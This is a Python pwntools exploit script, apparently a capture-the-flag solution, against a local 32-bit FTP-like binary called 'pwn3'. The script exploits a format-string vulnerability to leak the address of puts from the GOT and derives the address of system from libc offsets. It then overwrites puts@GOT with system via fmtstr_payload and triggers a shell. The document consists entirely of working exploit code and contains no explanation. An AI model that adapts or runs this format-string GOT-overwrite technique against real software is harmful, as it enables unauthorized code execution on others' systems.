from pwn import *
# context.log_level = 'debug'
#gdb.attach(pr, 'b * 0x804889B')
elf = ELF('pwn3')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
username = 'rxraclhm'
p = process('./pwn3')

p.recvuntil('Name (ftp.hacker.server:Rainism):')

p.sendline(username)

def put(p,name,content):

        p.recvuntil("ftp>")
        p.sendline('put')
        p.recvuntil("upload:")
        p.sendline(name)
        p.recvuntil('content:')
        p.sendline(content)

def get(p,name,num):
        p.recvuntil('ftp>')
        p.sendline('get')
        p.recvuntil('get:')
        p.sendline(name)
        return p.recvn(num)
def dir(p):

        p.recvuntil('ftp>')

        p.sendline('dir')
plt_puts = elf.symbols['puts']

#print('plt_puts = ' + hex(plt_puts))

got_puts = elf.got['puts']

#print('got_puts = ' + hex(got_puts))
put(p,'/sh','%8$s' + p32(got_puts))
leak_g_puts = get(p,'/sh',4)
puts_addr = u32(leak_g_puts)
#print('puts_addr = ' + hex(puts_addr))
system_addr = puts_addr - (libc.symbols['puts'] - libc.symbols['system'])
#print('system_addr = ' + hex(system_addr))
payload = fmtstr_payload(7, {got_puts: system_addr})#

put(p,'/bin',payload)
get(p,'/bin',0)
dir(p)
p.interactive()
